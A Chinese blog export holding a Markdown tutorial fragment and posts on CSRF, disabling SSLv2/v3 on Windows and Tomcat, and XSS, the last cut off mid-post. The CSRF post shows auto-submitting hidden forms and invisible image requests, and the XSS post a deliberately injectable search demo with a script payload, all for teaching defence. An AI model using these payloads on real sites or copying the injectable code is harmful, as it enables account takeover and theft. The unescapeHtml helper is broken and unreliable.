列表嵌套只需在子列表中的选项前面添加四个空格即可：举例：1. 第一项：    - 第一项嵌套的第一个元素    - 第一项嵌套的第二个元素2. 第二项：    - 第二项嵌套的第一个元素    - 第二项嵌套的第二个元素
区块
段落开头使用 &gt; 符号 ，然后后面紧跟一个空格符号：&gt; 区块引用&gt; 菜鸟教程&gt; 学的不仅是技术更是梦想

最外层

第一层嵌套

第二层嵌套



另外区块是可以嵌套的，一个 &gt; 符号是最外层，两个 &gt; 符号是第一层嵌套：&gt; 最外层&gt; &gt; 第一层嵌套&gt; &gt; &gt; 第二层嵌套

最外层

第一层嵌套

第二层嵌套



区块中使用列表
&gt; 区块中使用列表&gt; 1. 第一项&gt; 2. 第二项&gt; + 第一项&gt; + 第二项&gt; + 第三项

区块中使用列表

第一项
第二项


第一项
第二项
第三项


复选框
使用 - [ ] 和 - [x] 语法可以创建复选框，实现 todo-list 等功能。例如： - [x] 已完成事项 - [ ] 待办事项1 - [ ] 待办事项2

[ ] 已完成事项
[ ] 待办事项1
[x] 待办事项2

列表中使用区块
需要在 &gt; 前添加四个空格的缩进。列表中使用区块实例如下：* 第一项    &gt; 菜鸟教程    &gt; 学的不仅是技术更是梦想* 第二项


第一项

菜鸟教程
学的不仅是技术更是梦想



第二项


段落中代码
用 `代码内容` 包裹一段代码
用 代码内容 包裹一段代码
代码区块
用 ``` 包裹一段代码。可以指定一种语言
举例如下：
$(document).ready(function () {    alert('RUNOOB');});
链接
1. [链接名称](链接地址)  ：[百度](www.baidu.com)2. &lt;链接地址&gt;  ：&lt;www.baidu.com&gt;  3. 我们可以通过变量来设置一个链接，变量赋值在文档末尾进行：这个链接用 1 作为网址变量 [Google][1]。这个链接用 runoob 作为网址变量 [Runoob][runoob]。下面要空一行然后在文档的结尾为变量赋值（网址）  [1]: http://www.google.com/  [runoob]: http://www.runoob.com/


链接名称


&lt;www.baidu.com&gt;


这个链接用 1 作为网址变量 Google。这个链接用 runoob 作为网址变量 Runoob。下面要空一行


文档内部锚点引用
# 标题----## 目录1. [目录1](#jump1)2. [目录2](#jump2)---### &lt;span id="jump1"&gt;1. 目录1&lt;/span&gt;---### &lt;span id="jump2"&gt;2. 目录2&lt;/span&gt;
图片
![alt 属性文本](图片地址)![alt 属性文本](图片地址 "图片的title属性文字")开头一个感叹号 !接着一个方括号，里面放上图片的替代文字接着一个普通括号，里面放上图片的网址（最后还可以用引号包住并加上选择性的 'title' 属性的文字）Markdown 还没有办法指定图片的高度与宽度，如果你需要的话，你可以使用普通的 &lt;img&gt; 标签。&lt;img src="http://static.runoob.com/images/runoob-logo.png" width="20%"&gt;
如果希望图片左对齐，左对齐很简单，单行图片的情况下在前面输入一个空格就解决了，右对齐就需要靠css了
表格
|  表头   | 表头  ||  ----  | ----  || 单元格  | 单元格 || 单元格  | 单元格 |对齐方式我们可以设置表格的对齐方式：-: 设置内容和标题栏居右对齐。:- 设置内容和标题栏居左对齐。:-: 设置内容和标题栏居中对齐。



左对齐
右对齐
居中对齐




单元格
单元格
单元格


单元格
单元格
单元格



支持的 HTML 元素
不在 Markdown 涵盖范围之内的标签，都可以直接在文档里面用 HTML 撰写。目前支持的 HTML 元素有：&lt;kbd&gt; 定义键盘文本。它表示文本是从键盘上键入的&lt;b&gt; 加粗&lt;i&gt;斜体文本&lt;em&gt;呈现为被强调的文本&lt;sup&gt; 上标文本&lt;sub&gt; 下标文本&lt;br&gt; 换行&lt;video src="xxx.mp4" /&gt; 引入视频
这是使用 Ctrl+Alt+Del 重启电脑
这是 加粗
这是斜体文本
这是呈现为被强调的文本
这是 上标文本
这是 下标文本
这是 换行
转义
使用反斜杠转义特殊字符    **文本加粗**     \*\* 正常显示星号 \*\*Markdown 支持以下这些符号前面加上反斜杠来帮助插入普通的符号：    \   反斜线    `   反引号    *   星号    _   下划线    {}  花括号    []  方括号    ()  小括号    #   井字号    +   加号    -   减号    .   英文句点    !   感叹号
公式
当你需要在编辑器中插入数学公式时，可以使用两个美元符 $$ 包裹 TeX 或 LaTeX 格式的数学公式来实现
流程图、时序图(顺序图)、甘特图


横向流程图源码格式
graph LRA[方形] --&gt;B(圆角)    B --&gt; C{条件a}    C --&gt;|a=1| D[结果1]    C --&gt;|a=2| E[结果2]
   graph LR
A[方形] --&gt;B(圆角)
    B --&gt; C{条件a}
    C --&gt;|a=1| D[结果1]
    C --&gt;|a=2| E[结果2]


竖向流程图源码格式：
graph TDA[方形] --&gt; B(圆角)    B --&gt; C{条件a}    C --&gt; |a=1| D[结果1]    C --&gt; |a=2| E[结果2]    F[竖向流程图]
效果：
   graph TD
A[方形] --&gt; B(圆角)
    B --&gt; C{条件a}
    C --&gt; |a=1| D[结果1]
    C --&gt; |a=2| E[结果2]
    F[竖向流程图]


标准流程图源码格式：
st=&gt;start: 开始框op=&gt;operation: 处理框cond=&gt;condition: 判断框(是或否?)sub1=&gt;subroutine: 子流程io=&gt;inputoutput: 输入输出框e=&gt;end: 结束框st-&gt;op-&gt;condcond(yes)-&gt;io-&gt;econd(no)-&gt;sub1(right)-&gt;op
效果：
st=&gt;start: 开始框op=&gt;operation: 处理框cond=&gt;condition: 判断框(是或否?)sub1=&gt;subroutine: 子流程io=&gt;inputoutput: 输入输出框e=&gt;end: 结束框st-&gt;op-&gt;condcond(yes)-&gt;io-&gt;econd(no)-&gt;sub1(right)-&gt;op


标准流程图源码格式（横向）：
st=&gt;start: 开始框op=&gt;operation: 处理框cond=&gt;condition: 判断框(是或否?)sub1=&gt;subroutine: 子流程io=&gt;inputoutput: 输入输出框e=&gt;end: 结束框st(right)-&gt;op(right)-&gt;condcond(yes)-&gt;io(bottom)-&gt;econd(no)-&gt;sub1(right)-&gt;op
st=&gt;start: 开始框op=&gt;operation: 处理框cond=&gt;condition: 判断框(是或否?)sub1=&gt;subroutine: 子流程io=&gt;inputoutput: 输入输出框e=&gt;end: 结束框st(right)-&gt;op(right)-&gt;condcond(yes)-&gt;io(bottom)-&gt;econd(no)-&gt;sub1(right)-&gt;op


UML时序图源码样例：
对象A-&gt;对象B: 对象B你好吗?（请求）Note right of 对象B: 对象B的描述Note left of 对象A: 对象A的描述(提示)对象B--&gt;对象A: 我很好(响应)对象A-&gt;对象B: 你真的好吗？
对象A-&gt;对象B: 对象B你好吗?（请求）Note right of 对象B: 对象B的描述Note left of 对象A: 对象A的描述(提示)对象B--&gt;对象A: 我很好(响应)对象A-&gt;对象B: 你真的好吗？
6、UML时序图源码复杂样例：
Title: 标题：复杂使用对象A-&gt;对象B: 对象B你好吗?（请求）Note right of 对象B: 对象B的描述Note left of 对象A: 对象A的描述(提示)对象B--&gt;对象A: 我很好(响应)对象B-&gt;小三: 你好吗小三--&gt;&gt;对象A: 对象B找我了对象A-&gt;对象B: 你真的好吗？Note over 小三,对象B: 我们是朋友participant CNote right of C: 没人陪我玩
Title: 标题：复杂使用对象A-&gt;对象B: 对象B你好吗?（请求）Note right of 对象B: 对象B的描述Note left of 对象A: 对象A的描述(提示)对象B--&gt;对象A: 我很好(响应)对象B-&gt;小三: 你好吗小三--&gt;&gt;对象A: 对象B找我了对象A-&gt;对象B: 你真的好吗？Note over 小三,对象B: 我们是朋友participant CNote right of C: 没人陪我玩
7、UML标准时序图样例：
%% 时序图例子,-&gt; 直线，-&gt;&gt;实线箭头，--&gt;虚线，--&gt;&gt;虚线箭头  sequenceDiagram    participant 张三    participant 李四    张三-&gt;王五: 王五你好吗？    loop 健康检查        王五-&gt;王五: 与疾病战斗    end    Note right of 王五: 合理 食物 &lt;br/&gt;看医生...    李四--&gt;&gt;张三: 很好!    王五-&gt;李四: 你怎么样?    李四--&gt;王五: 很好!
   %% 时序图例子,-&gt; 直线，-&gt;&gt;实线箭头，--&gt;虚线，--&gt;&gt;虚线箭头
  sequenceDiagram
    participant 张三
    participant 李四
    张三-&gt;王五: 王五你好吗？
    loop 健康检查
        王五-&gt;王五: 与疾病战斗
    end
    Note right of 王五: 合理 食物 看医生...
    李四--&gt;&gt;张三: 很好!
    王五-&gt;李四: 你怎么样?
    李四--&gt;王五: 很好!
8、甘特图样例：
%% 语法示例  gantt  dateFormat  YYYY-MM-DD  title 软件开发甘特图  section 设计  需求:done, des1, 2014-01-06,2014-01-08  原型 :active,  des2, 2014-01-09, 3d  UI设计:des3, after des2, 5d未来任务:des4, after des3, 5d  section 开发  学习准备理解需求 :crit, done, 2014-01-06,24h  设计框架  :crit, done, after des2, 2d  开发:crit, active, 3d  未来任务:crit, 5d  耍  :2d  section 测试  功能测试:active, a1, after des3, 3d  压力测试 :after a1  , 20h  测试报告 : 48h
   %% 语法示例
  gantt
  dateFormat  YYYY-MM-DD
  title 软件开发甘特图
  section 设计
  需求:done, des1, 2014-01-06,2014-01-08
  原型 :active,  des2, 2014-01-09, 3d
  UI设计:des3, after des2, 5d
未来任务:des4, after des3, 5d
  section 开发
  学习准备理解需求 :crit, done, 2014-01-06,24h
  设计框架  :crit, done, after des2, 2d
  开发:crit, active, 3d
  未来任务:crit, 5d
  耍  :2d
  section 测试
  功能测试:active, a1, after des3, 3d
  压力测试 :after a1  , 20h
  测试报告 : 48h


]]></content>
      <categories>
        <category>博客搭建</category>
        <category>Markdown语法</category>
      </categories>
  </entry>
  <entry>
    <title>CSRF漏洞处理</title>
    <url>/20221025/96960bec.html</url>
    <content><![CDATA[前端安全系列：CSRF篇
CSRF介绍
CSRF（Cross-site request forgery）跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户的请求来利用受信任的网站。攻击通过在授权用户访问的页面中包含链接或者脚本的方式工作
CSRF攻击
一个典型的CSRF攻击流程大概如下:

用户登录a.com并保留登录信息
攻击者引诱用户访问了b.com
b.com在用户不知情的情况下向a.com发送请求并携带用户的登录信息
a.com接收请求验证登录信息通过执行某些恶意操作
攻击者在用户不知情的情况下冒充用户的身份完成了攻击.

攻击方式:

攻击者的网站
有文件上传漏洞的网站
第三方论坛,博客等网站
目标网站自身的漏洞

相对XSS攻击,CSRF攻击不太一样

一般攻击发起点不在目标网站,而是被引导到第三方网站再发起攻击,这样目标网站就无法防止
攻击者不能获取到用户Cookies,包括子域名,而是利用Cookies的特性冒充用户身份进行攻击
通常是跨域攻击,因为攻击者更容易掌握第三方网站而不是只能利用目标网站自身漏洞
攻击方式包括图片,URL,CORS,表单,甚至直接嵌入第三方论坛,文章等等,难以追踪

常见的CSRF攻击类型
GET请求
例如利用隐藏图片自动发起一个HTTP请求,会自动附带用户cookies
&lt;img style="width:0;" src="https://www.test.com/xxx" /&gt;
POST请求
例如利用隐藏表单自动提交
&lt;form action="https://www.test.com/xxx" method=POST&gt;    &lt;input type="hidden" name="account" value="xiaoming" /&gt;    &lt;input type="hidden" name="amount" value="10000" /&gt;&lt;/form&gt;&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 
URL攻击
比较常见的利诱广告方式或者冒充QQ病毒警告等引诱用户自己点击
&lt;a href="https://www.test.com/xxx" taget="_blank"&gt;  一刀9999级,神级装备,顶级神宠,开服就有！！&lt;a/&gt;
防御：限制访问名单
同源检测
HTTP协议中一般会携带两个带有来源信息的字段:
Origin
指示了请求来自于哪个站点。该字段仅指示服务器名称，并不包含任何路径信息, 用于 CORS 请求或者 POST 请求。Origin在以下两种情况下并不存在：

IE 11 不会在跨站CORS请求上添加Origin标头
302重定向之后Origin不包含在重定向的请求中，因为Origin可能会被认为是其他来源的敏感信息。对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上。

Referer
包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 Referer 首部识别访问来源，可能会以此进行统计分析、日志记录以及缓存优化等。

对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。
对于页面跳转，Referer为打开页面历史记录的前一个页面地址

在以下情况下，Referer 不会被发送：

来源页面采用的协议为表示本地文件的 “file” 或者 “data” URI
当前请求页面采用的是非安全协议，而来源页面采用的是安全协议（HTTPS）

虽然HTTP有明确要求,也有Referrer Policy草案对浏览器如何发送做了详细规定,但是浏览器实现可能有差别,不能保障安全性.低版本浏览器,Flash等情况可能丢失或不可信,新的Referrer规定了五种策略：



States
作用




no-Referrer
任何情况下都不发送Referrer信息


no-Referrer-when-downgrade
仅当协议降级（如HTTPS页面引入HTTP资源）时不发送Referrer信息。是大部分浏览器默认策略


origin
发送只包含host部分的referrer.


origin-when-cross-origin
仅在发生跨域访问时发送只包含host的Referer，同域下还是完整的。与Origin Only的区别是多判断了是否Cross-origin。协议、域名和端口都一致，浏览器才认为是同域


unsafe-url
全部都发送Referrer信息。最宽松最不安全的策略



设置Referrer Policy的方法有:


在HTTP的CSP（Content Security Policy）设置
Content-Security-Policy: referrer no-referrer|no-referrer-when-downgrade|origin|origin-when-cross-origin|unsafe-url;


页面头部增加meta标签, 默认no-referer策略
&lt;meta name="referrer" content="no-referrer|no-referrer-when-downgrade|origin|origin-when-crossorigin|unsafe-url"&gt;


a标签增加Referrer Policy属性,只支持三种
&lt;a href="http://example.com" referrer="no-referrer|origin|unsafe-url"&gt;xxx&lt;/a&gt;


发起请求的来源域名可能是网站本域，或者子域名，或者有授权的第三方域名，又或者来自不可信的未知域名。业务上需要针对各种情况作出过滤规则,一般优先使用Origin确认来源信息就够了,Referrer 变数太多比较适合打辅助.但是如果两者都获取不到的情况下,建议直接进行阻止.
同源规则能简单防范大多数CSRF攻击,配合关键接口做额外处理能更好提高安全性.
SameSite
一种新的防止跨站点请求伪造（cross site request forgery）的 http 安全特性。该值可以设置为 Strict 或 Lax,现阶段只有部分主流浏览器支持,仅做了解即可
Set-Cookie: key=value; SameSite=Strict/Lax

Strict: 跨域请求或者新标签重新打开都不会携带该Cokies
Lax: 这个请求是（改变了当前页面或者打开了新页面）且同时是个GET请求，则携带。

还有一个比较严重的问题是SameSite不支持子域名.
防御：附加验证
验证码
通过图形验证码或者手机验证码或者邮箱验证等多种方式强制用户进行交互可以有效遏制CSRF攻击,缺点是步骤比较繁琐,只适用于如涉及金额,密码相关等关键请求,
CSRF Token
基于攻击者无法获得用户信息的特性,我们可以在前后端交互中携带一个有效验证“令牌”来防范CSRF攻击,大概流程:

当用户首次登录成功之后, 服务端会生成一个唯一性和随机性的 token 值保存在服务器的Session或者其他缓存系统中，再将这个token值返回给浏览器；
浏览器拿到 token 值之后本地保存；
当浏览器再次发送网络请求的时候,就会将这个 token 值附带到参数中(或者通过Header头)发送给服务端；
服务端接收到浏览器的请求之后,会取出token值与保存在服务器的Session的token值做对比验证其正确性和有效期。

在大型网站一般使用多台服务器,用户请求经过负载均衡器路由到具体的服务器上,如果使用Session默认储存在单机服务器内存中,在分布式环境下同一用户的多次请求可能会指向不同的服务器上,而其他的服务器无法共享Session导致Session机制失效无法验证,所以分布式集群中Token需要储存在Redis等公共储存空间.
因为读取和验证Token会有复杂度和性能的问题,还有种方式采用Encrypted Token Pattern方式,通常是使用UserID、时间戳和随机数，通过加密的方法生成而非随机性,之后请求校验不需要读取而是直接计算即可,这样既可以保证分布式服务的Token一致，又能保证Token不容易被破解。
双重Cookie验证
相较于CSRF Token,这种方式比较简单实现但是安全性较低.大概流程:

用户访问页面之后域名被注入随机字符串Cookie
浏览器发起请求时会取出该Cookie字符串添加到URL参数中
服务端验证是否一致

没有大规模应用除了安全性问题还有一个就是跨域可能导致获取不到Cookie.

用户访问网站域名www.test.com,服务端api域名api.test.com,
如果想要共用Cookie就必须注入到test.com,然后子域名都能获取到
同理每个子域名都能修改该Cookie,如果某个子域名被攻击了
攻击者可以自己配置一个Cookie破解双重Cookie验证机制拦截

]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>SSL漏洞处理</title>
    <url>/20221025/d188606.html</url>
    <content><![CDATA[一：漏洞扫描结果


SSL/TLS 存在Bar Mitzvah Attack漏洞




详细描述
该漏洞是由功能较弱而且已经过时的RC4加密算法中一个问题所导致的。它能够在某些情况下泄露SSL/TLS加密流量中的密文，从而将账户用户名密码、信用卡数据和其他敏感信息泄露给黑客。




解决办法
1、服务器端禁止使用RC4加密算法。 2、客户端应在浏览器TLS配置中禁止RC4。


威胁分值
5


危险插件
否


发现日期
2015-03-29


CVE编号
CVE-2015-2808


BUGTRAQ
73684


NSFOCUS
30491


CNNVD编号
CNNVD-201503-654


CNCVE编号
CNCVE-20152808


CNVD编号
CNVD-2015-02171


CVSS评分
5.3(CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)




SLv3 存在严重设计缺陷漏洞 (CVE-2014-3566)




详细描述
SSLv3漏洞（CVE-2014-3566），该漏洞贯穿于所有的SSLv3版本中，利用该漏洞，黑客可以通过中间人攻击等类似的方式(只要劫持到的数据加密两端均使用SSL3.0)，便可以成功获取到传输数据(例如cookies)。 针对此漏洞，需要服务器端和客户端均停用SSLv3协议。




二：说明

首先说明一下，SSL 2 和 SSL 3 协议是两种过时的协议，原因是它们存在很严重的漏洞，所以我们要在服务端禁用 SSL 2 和 SSL 3 协议，以避免一些安全问题。

SSL 2 协议：漏洞名为 DROWN（溺水攻击 / 溺亡攻击）。DROWN 漏洞可以利用过时的 SSL 2 协议来解密与之共享相同 RSA 私钥的 TLS 协议所保护的流量。
SSL 3 协议：漏洞名为 POODLE（卷毛狗攻击）。POODLE 漏洞只对 CBC 模式的明文进行了身份验证，但是没有对填充字节进行完整性验证，攻击者窃取采用 SSL 3 版加密通信过程中的内容，对填充字节修改并且利用预置填充来恢复加密内容，以达到攻击目的。

关于更多基于 SSL/TLS 协议的漏洞，请查看这篇文章《常见的几种 SSL/TLS 漏洞及攻击方式》。
在 Windows 系统中，服务器如果使用 Windows Server 2016 版本系统，那么恭喜你了，你可以省去禁用 SSL 2 和 SSL 3 协议的工作了，因为在此版本系统以后，微软已经默认禁用这两种协议了。如果你还不放心，下面有 SSL 服务器测试能帮你检测。其它版本系统，可参照下文介绍的 2 种设置方法来禁用协议。
三：SSL 服务器测试

使用下面两个测试网站，可以查看你的网站的安全状态。

SSL Labs 网址：https://www.ssllabs.com/ssltest/index.html
My SSL 网址：https://myssl.com/

四：处理
方法一： 禁用 SSL 2 和 SSL 3 协议

1、通过修改注册表禁用协议


Win + R 键，打开运行，输入 regedit ，打开“注册表编辑器”。


在注册表编辑器，找到以下注册表项/文件夹：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols


在“SSL 2.0”文件夹，右键单击并选择“新建”，然后单击“项(K)”。然后重命名文件夹为“Server”。


右键点击“Sever”文件夹，选择“新建”，然后单击“DWORD（32-bit）值”。


将新建的 DWORD 重命名为“Enabled”，并按下回车键或者双击查看。


请确保它显示 0x00000000（0）。如果没有，请右键单击并选择修改，输入 0 作为数值数据。


现在，禁用 SSL 3，对“SSL 3.0”文件夹，右键单击并选择“新建”，然后单击“项(K)”。命名新的文件夹为“Server”。


右键点击“Sever”文件夹，选择“新建”，然后单击 DWORD（32-bit）值。


将新建的 DWORD 重命名为“Enabled”，并按下回车键或者双击查看。


请确保它显示 0x00000000（0）的数据列下。如果没有，请右键单击并选择修改，输入 0 作为数值数据。



重新启动计算机。


2、使用 IIS Crypto 工具
IIS Crypto 是一个免费工具，使管理员能够在 Windows Server 2008，2012，2016 和 2019 上启用或禁用协议，密码，哈希和密钥交换算法。它还允许您重新排序 IIS 提供的 SSL / TLS 密码套件，更改高级设置，只需单击即可实施最佳实践，创建自定义模板并测试您的网站。

使用这个工具，设置简单方便，功能也多，懒人必备啊。这个工具需要安装到服务器，并且需要管理员权限。
IIS Crypto 工具网址：https://www.nartac.com/Products/IISCrypto/
参考文献：微软文档：Protocols in TLS/SSL (Schannel SSP) - Windows applications
方法二： 开启Tomcat7的HTTPS访问
在方法一策略实施之后，扫描结果 SSL3.0 依然支持访问，也就意味着漏洞扫描结果依然存在，决定开启Tomcat7 的 https 访问方式。
参考文献： CA证书服务配置Tomcat、Tomcat7下对HTTPS的部署配置
一、什么是CA证书，可以用来做什么，为啥大家都爱用？
​	云盾证书服务（Alibaba Cloud Certificates Service）是阿里云联合多家国内外知名 CA 证书厂商，在阿里云平台上直接提供服务器数字证书，阿里云用户可以在云平台上直接购买、甚至免费获取所需类型的数字证书，并一键部署在阿里云产品中，以最小的成本实现将所持服务从 HTTP 转换成 HTTPS。
​	其实按照个人理解简化说的话，CA可以帮助我们从HTTP转化为HTTPS，保证了中间传输数据的安全性。至于大家为啥都爱用，主要有两点：安全性和强制性。
​	安全性我们都知道，相比起HTTPS协议来说，HTTP协议是以明文方式发送内容，不提供任何方式的数据加密，如果攻击者拦截了Web浏览器和服务器之间的传输报文，便能直接知道里面的信息，因此http不适合传输一些含有敏感信息，例如：卡号、密码等。为了解决HTTP协议的这个缺陷，所以另一个协议就诞生了：安全套接字层超文本传输协议HTTPS，为了数据传输的安全，HTTPS在HTTP基础上面增加了SSL协议，SSL协议依靠证书来验证服务器的身份，并且为浏览器和服务器之间的通信加密，所以比起HTTP更多人用HTTPS的其中之一原因就是这样来的。
二、如何申请CA证书服务（用户提供，跳过）


进入控制台选择CA证书服务



点击购买证书



选择，我这里是选择免费的，所以我会点击一个域名，品牌使用Symantec，然后就会有一个免费型的DV出来，如果自己测试想要免费的话跟着我来就可以用了。



点击立即购买



选择支付



进入证书控制台



购买成功后会有一条记录，我们选择补全



输入你的域名



填入你的相关信息（建议：个人建议域名验证类型使用DNS不要选择文件，选择系统生成的CSR，由于小编自己的域名是买的腾讯云的，服务器是阿里的所以我就不点击证书绑定的域名了，如果服务器和域名都在阿里的话可以点击）然后下一步。



提交审核，审核时间一天内就可以了



三、CA证书服务配置Tomcat
准备证书文件
自己拥有的证书（未参考，跳过）


选择审核通过的证书进行下载



我这里选择的是Tomcat，你们可以自行选择，下载压缩包




选择PFX格式的到Tomcat进行相关配置，跟着我上面操作的可以直接跳到第二步，完整信息配置需要记下，后面配置需要



用户提供证书，转PFX格式


用户提供证书文件列表

XXXXX.pem
XXXXX.key



注册网站：https://app.certbase.com，利用证书工具将证书.PEM格式转换为.pfx格式



转换并下载，获得文件列表

XXXXX.pfx
password.txt （保存的是页面设置PFX密码）



Tomcat配置证书


将下载好的压缩包解压之后将所有的文件都放到tomcat目录下创建的cert目录中（目录名称自定义）


点开server.xml文件, 添加配置
&lt;Connector port="443"		protocol="org.apache.coyote.http11.Http11Protocol"		SSLEnabled="true"		scheme="https"		secure="true"		keystoreType="PKCS12"        keystoreFile="PFX所在地的完整路径"        keystorePass="password.txt中的文本内容"		clientAuth="false"		SSLProtocol="TLSv1+TLSv1.1+TLSv1.2"           ciphers="TLS_RSA_WITH_AES_128_CBC_SHA,TLS_RSA_WITH_AES_256_CBC_SHA,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256,TLS_RSA_WITH_AES_128_CBC_SHA256,TLS_RSA_WITH_AES_256_CBC_SHA256"/&gt;
说明：



配置文件参数
说明




clientAuth
如果设为true，表示Tomcat要求所有的SSL客户出示安全证书，对SSL客户进行身份验证


keystoreFile
指定keystore文件的存放位置，可以指定绝对路径，也可以指定相对于&lt;catalina_home&gt; （Tomcat安装目录）环境变量的相对路径。如果此项没有设定，默认情况下，Tomcat将从当前操作系统用户的用户目录下读取名为 “.keystore”的文件。


keystorePass
密钥库密码，指定keystore的密码。（如果申请证书时有填写私钥密码，密钥库密码即私钥密码）


SSLProtocol
指定套接字（Socket）使用的加密/解密协议，默认值为TLS





http自动跳转https的安全配置（）
到conf目录下的web.xml。在&lt;/welcome-file-list&gt;后面，&lt;/web-app&gt;，也就是倒数第二段里，加上这样一段
&lt;security-constraint&gt;&lt;web-resource-collection &gt;    &lt;web-resource-name &gt;SSL&lt;/web-resource-name&gt;    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/web-resource-collection&gt;&lt;user-data-constraint&gt;    &lt;transport-guarantee&gt;CONFIDENTIAL&lt;/transport-guarantee&gt;&lt;/user-data-constraint&gt;&lt;/security-constraint&gt;
这步目的是让非ssl的connector跳转到ssl的connector去。所以还需要前往server.xml进行配置80端口跳转443：
&lt;Connector port="8080" protocol="HTTP/1.1"    connectionTimeout="20000"    redirectPort="443" /&gt;


由于tomcat对ssl的实现由两种方式，tomcat7默认实现是APR方式，所以这里我们要对server.xml再进行相关修改



重启Tomcat


本地进行https:// 域名测试，是否可正常访问


防火墙开放443端口出口访问


需要网络管理员进行内网端口映射
参考图：



外网访问https://域名 测试，是否可正常访问


漏洞再次扫描：此时SSL 3 状态变更为关闭状态。


]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS漏洞处理</title>
    <url>/20221025/409b5317.html</url>
    <content><![CDATA[前端安全系列：XSS篇
XSS攻击
全称跨站脚本攻击，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中
XSS攻击的危害

盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号
控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
盗窃企业重要的具有商业价值的资料
非法转账
强制发送电子邮件
网站挂马
控制受害者机器向其它网站发起攻击

XSS漏洞的分类
本地利用漏洞
这种漏洞存在于浏览器页面中,属于前端自身问题基于DOM文档对象模型的一种漏洞,大概步骤:

A给B发送一个恶意构造的URL
B打开恶意URL
B的浏览器页面中包含恶意代码
A的恶意代码可以拥有B的持有权限,进而获取B的数据或者冒充B的行为

通过修改浏览器页面中的DOM(DocumentObjectModel)时，就有可能产生这种漏洞
反射式漏洞
服务端没有对数据进行过滤、验证或者编码等处理直接返回前端可能引起的漏洞

A给B发送一个恶意构造的URL
B打开目标网站,浏览器将包含恶意代码的数据通过请求传递给服务端,其不加处理直接返回给浏览器
B的浏览器接收到响应后解析并执行的代码中包含恶意代码
A的恶意代码可以拥有B的持有权限,进而获取B的数据或者冒充B的行为

常见于网站搜索栏,登录注册等地方窃取用户cookies或者进行钓鱼欺骗.因为其中涉及到服务端的参与,想要避免需要后端协调.
存储式漏洞
类似反射式但是会把未经处理的数据储存在数据库中

A将恶意代码提交到目标网站的数据库中
B打开目标网站,服务端将恶意代码从数据库取出拼接在HTML中返回给浏览器
B的浏览器接收到响应后解析并执行的代码中包含恶意代码
A的恶意代码可以拥有B的持有权限,进而获取B的数据或者冒充B的行为

这是属于持久性攻击,涉及范围可能包括所有的访问用户,一般常用网站留言,评论,博客日志等.
大致对比



类型
本地利用
反射式
存储式




触发
用户打开恶意构造的URL
用户打开恶意构造的URL
1. 用户打开恶意构造的URL 2. 攻击者构造脚本


储存
URL
URL
数据库


输出
前端
后端
后端


方式
DOM
HTTP响应
HTTP响应



XSS 常见案例
公司网站新上线一个搜索功能,B写了这段代码
&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;    &lt;head&gt;        &lt;meta charset="UTF-8" /&gt;        &lt;meta name="viewport" content="width=device-width, initial-scale=1.0" /&gt;        &lt;meta http-equiv="X-UA-Compatible" content="ie=edge" /&gt;        &lt;title&gt;demo&lt;/title&gt;        &lt;style&gt;            input {                width: 600px;            }        &lt;/style&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;div&gt;            input:            &lt;input type="text" id="in" /&gt;            &lt;button type="submit" id="submit"&gt;submit&lt;/button&gt;        &lt;/div&gt;        &lt;br /&gt;        &lt;div&gt;            output:            &lt;input id="out" /&gt;        &lt;/div&gt;        &lt;script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"&gt;&lt;/script&gt;        &lt;script&gt;            $(function() {                var $input = $('#in');                var $output = $('#out');                var $submit = $('#submit');                $submit.click(function() {                    var val = $input.val();                    $output.val(val).html(val);                });            });        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;
完整源码可以查看demo1
某天,让A知道之后他输入这么一段代码,然后提交之后发现
&lt;script&gt;alert('XSS');&lt;/script&gt;

类似的用户输入内容都可能被攻击者利用拼接特殊格式的字符串形成恶意代码,通过注入脚本引发潜在风险,浏览器不会区分善恶,只是按照代码解析,于是B想了一个办法告诉浏览器这段内容不该解析,所以改了一下,简单转义输入内容
function escapeHtml(text) {  return text.replace(/[&lt;&gt;"&amp;]/g, function(match, pos, originalText) {    switch (match) {      case '&lt;':        return '&amp;lt;';      case '&gt;':        return '&amp;gt;';      case '&amp;':        return '&amp;amp;';      case '"':        return '&amp;quot;';    }  });}function unescapeHtml(str) {  return text.replace(/[&lt;&gt;"&amp;]/g, function(match, pos, originalText) {    switch (match) {      case '&amp;lt;':        return '&lt;';      case '&amp;gt;':        return '&gt;';      case '&amp;amp;':        return '&amp;';      case '&amp;quot;':        return '"';    }  });}$submit.click(function() {  var val = escapeHtml($input.val());  $output.val(val).html(val);});
完整源码可以查看demo2
现在浏览器就不会再执行里面的代码了,实际业务中应该转义的内容不止这么简单

基于某些业务,例如登录,订单等需要携带参数或者重定向等信息,B写了这么一个页面
